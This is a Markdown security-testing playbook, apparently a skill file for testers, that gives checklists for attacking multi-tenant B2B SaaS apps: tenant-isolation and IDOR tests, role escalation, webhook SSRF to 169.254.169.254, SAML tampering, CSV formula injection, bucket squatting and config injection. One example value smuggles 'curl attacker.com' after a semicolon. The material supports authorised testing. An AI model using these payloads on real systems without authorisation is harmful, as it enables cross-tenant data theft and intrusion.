---
name: b2b-saas
category: archetypes
description: B2B SaaS testing covering multi-tenancy isolation, organization-level IDOR, invite/permission escalation, API key management, webhook security, SSO flaws, and data export/import abuse
---

# B2B SaaS Testing

Security testing playbook for B2B SaaS platforms. Focus on multi-tenancy isolation, organization-level IDOR, invite and permission escalation, API key management, webhook security, SSO integration flaws, and data export/import abuse.

## When to Use

- Target is a multi-tenant B2B application with organization/workspace concepts
- Application has role-based access control with admin/member/viewer tiers
- Users can invite others, manage API keys, or configure integrations
- SSO/SAML/OIDC integrations are available for enterprise customers
- Application supports data import/export, webhooks, or third-party integrations

## Priority Checklist

### 1. Multi-Tenancy Isolation

- **Cross-tenant data access**: query resources using another tenant's IDs in API parameters
- **Shared infrastructure leaks**: cache keys, queue names, or storage paths predictable across tenants
- **Subdomain isolation**: tenant-specific subdomains share cookies or session state
- **Search/filter leaks**: global search returns results from other tenants
- **Background job leaks**: async jobs process data without tenant context validation
- Test: create two tenant accounts, capture resource IDs from tenant A, replay in tenant B's session

### 2. Organization-Level IDOR

- **Workspace ID enumeration**: sequential or predictable workspace/org IDs in API paths
- **Resource scoping bypass**: API accepts org_id as a parameter but does not validate membership
- **Nested resource access**: `/orgs/{orgA}/projects/{projFromOrgB}` returns cross-tenant data
- **Invitation token reuse**: invite links scoped to one org accepted by another
- **Billing/subscription IDOR**: access or modify another org's billing, plan, or usage data
- Test: swap org_id/workspace_id in every API call and check for unauthorized data access

### 3. Invite and Permission Escalation

- **Self-promotion**: change your own role from member to admin via API parameter manipulation
- **Invite privilege escalation**: invite a new user with higher privileges than your own role
- **Stale invite exploitation**: accept an invitation after the inviter's permissions were revoked
- **Role bypass via API**: UI restricts admin actions but API endpoints lack role checks
- **Ghost member persistence**: removed users retain access through cached sessions or API keys
- Test: as a member, call admin-only endpoints; modify the role field in invite requests

### 4. API Key Management

- **Key scope escalation**: API key created with read-only scope but accepted for write operations
- **Key leakage in responses**: API keys returned in list endpoints or error messages
- **Revocation bypass**: revoked keys remain valid due to caching or async invalidation delays
- **Cross-org key acceptance**: API key from org A accepted in org B's context
- **Key rotation race**: during rotation, both old and new keys valid with no grace period control
- Test: create a limited-scope key and attempt operations beyond its declared permissions

### 5. Webhook Security

- **SSRF via webhook URL**: register a webhook pointing to internal services (169.254.169.254, localhost)
- **Missing signature verification**: webhook payloads accepted without HMAC validation
- **Replay attacks**: captured webhook payloads replayed without timestamp or nonce validation
- **Information disclosure**: webhook payloads contain sensitive data sent to attacker-controlled endpoints
- **Callback injection**: webhook URL parameters interpreted as template directives or path traversal
- Test: register webhook to a Burp Collaborator URL and inspect payloads for sensitive data

### 6. SSO Integration Flaws

- **SAML response manipulation**: modify SAML assertions to change email, role, or org membership
- **IdP confusion**: application accepts SAML responses from any IdP, not just the configured one
- **SSO bypass**: direct login (email/password) remains active after SSO enforcement is enabled
- **Account linking abuse**: link an SSO identity to an existing account without proper ownership verification
- **JIT provisioning escalation**: just-in-time user creation assigns default role that is too permissive
- Test: intercept SAML response, modify NameID or attribute values, replay to the SP

### 7. Data Export/Import Abuse

- **Export IDOR**: export endpoint accepts any org/project ID without authorization check
- **Import injection**: CSV/JSON import with formulas (=CMD), script payloads, or oversized fields
- **Bulk data exfiltration**: export endpoints lack rate limiting, enabling full database dump
- **Import path traversal**: file import processes filenames or paths without sanitization
- **Format-specific attacks**: XLSX with external entity references, CSV injection into downstream tools
- Test: trigger an export for another org's data; import a CSV with `=HYPERLINK()` formula injection

### 8. Cloud Resource Pre-emption

- **Deterministic name squatting**: when the platform auto-creates cloud resources (S3 buckets, DNS records, GCP projects) using predictable names (e.g., `{tenant-slug}-uploads`), register the resource before the victim tenant does
- **Subdomain takeover via dangling CNAME**: deprovisioned tenant subdomains still point to unclaimed cloud endpoints
- **Storage namespace collision**: shared storage backends with tenant-prefixed paths where the prefix is user-controllable
- Test: sign up as `target-corp`, observe what cloud resources are auto-created, then sign up as `target-corp-uploads` or pre-register the S3 bucket name

### 9. Field Masking and Projection Bypass

- **`fields=` parameter override**: when the API supports field projection (`?fields=name,email`), add restricted fields (`?fields=name,email,ssn,api_key`) and check if the server returns them
- **GraphQL over-fetch**: query for fields your role should not see; the resolver may authorize the query but not individual field access
- **Sparse fieldset in JSON:API**: add `fields[users]=email,password_hash` to see if the backend filters at the serializer or the query layer
- **Response shape diffing**: compare admin vs member responses for the same endpoint; any field present in admin-only is a candidate for direct request
- Test: capture a normal list endpoint response, add every plausible field name you can find in docs/JS bundles to the `fields` or `select` parameter

### 10. State-Machine Order Abuse in Multi-Step Flows

- **Step-skip**: for every multi-step flow (onboarding, plan upgrade, team setup, payment update), skip directly to the final step via API
- **Out-of-order completion**: complete step 3 before step 1; if each step only checks "is step N-1 done?", jump to the last step
- **Parallel step race**: submit two steps simultaneously from different sessions to produce inconsistent intermediate state
- **Abandoned flow exploitation**: start a privileged flow (e.g., plan upgrade), abandon it, check if the intermediate state grants partial access
- Test: map every multi-step flow, capture each step's request, replay the final step without completing earlier ones

### 11. Cross-Tenant Reference Injection

- **@mention / slash-command cross-tenant lookup**: in collaborative features, mention `@user` or `/command` with an entity from another tenant and observe if it resolves
- **Copy/transfer/move across orgs**: features that move resources between projects may accept a destination project ID from a different organization
- **Shared integration tokens**: integrations (Slack, Jira, GitHub) configured for org A reusable by org B if the webhook URL or token is guessable
- Test: in any "@mention", "/command", or "move to project" flow, substitute entity IDs from a second test tenant

### 12. Pre-Auth Preview and Invitation Link Leaks

- **Invitation preview without auth**: access the invitation URL without logging in to see workspace name, member list, or project metadata
- **Incremental invitation token enumeration**: if tokens are sequential or low-entropy, enumerate to discover other pending invitations
- **Invitation link in referrer**: accepting an invitation redirects through a page that leaks the token via Referer header to third-party scripts
- **Expired invitation data leak**: expired invitation links still render a preview page revealing org structure
- Test: generate an invitation link, open it in an incognito window without logging in, and inspect what data the preview page exposes

### 13. CSRF at Component Boundaries

- **Microservice CSRF gap**: the API gateway enforces CSRF tokens but a backend microservice exposed on a different path or subdomain does not
- **GraphQL mutation CSRF**: GraphQL endpoint accepts `application/x-www-form-urlencoded` or `GET` queries, bypassing CSRF protection that only checks `application/json`
- **Webhook registration CSRF**: registering a webhook to attacker-controlled URL via CSRF to exfiltrate future event data
- Test: map all state-changing endpoints, identify which component (gateway, app, microservice) enforces CSRF, and test each component independently

### 14. Configuration-Language Injection

- **Template injection in generated configs**: when the platform generates config files (Nginx, Terraform, CI pipelines) using tenant-supplied values, inject template directives
- **Environment variable injection**: tenant-supplied values interpolated into environment variables without escaping (e.g., `TENANT_NAME=evil;curl attacker.com`)
- **Build pipeline poisoning**: CI/CD integrations that evaluate tenant-controlled strings in shell contexts during build steps
- Test: set your organization name, project name, or custom domain to values containing `${...}`, `#{...}`, backticks, or semicolons; trigger config regeneration

## Pro Tips

- **API-vs-UI consistency is the highest-yield test for B2B SaaS.** When the UI hides a feature based on permission tier, always verify the API enforces the same restriction. Premium features gated only in the frontend are direct escalation paths.
- **Import/export endpoints are privilege boundaries.** Treat every import endpoint as a deserialization surface: test CSV formula injection, XML external entities in XLSX, path traversal in filenames, and oversized field denial-of-service.
- **Audit the (object, target_principal, actor) tuple.** For every state-changing operation in a multi-tenant product, extract these three values from the request and test all cross-substitution combinations (your actor + their object, your actor + their principal, etc.).
- **Internal tooling surfaces pay premium.** Corporate domains, employee dashboards, and admin portals are often in scope and pay at top tier even for standard-severity bugs. Check for them in JS source maps, DNS records, and error pages.

## Validation

- Demonstrate cross-tenant data access with concrete resource content from another organization
- Show permission escalation with before/after role state and the exact API call used
- Prove SSRF via webhook with DNS/HTTP interaction evidence from internal endpoints
- Confirm SSO bypass or assertion manipulation with authenticated session in wrong org/role
- Document tenant IDs, API calls, request/response pairs, and observable access changes
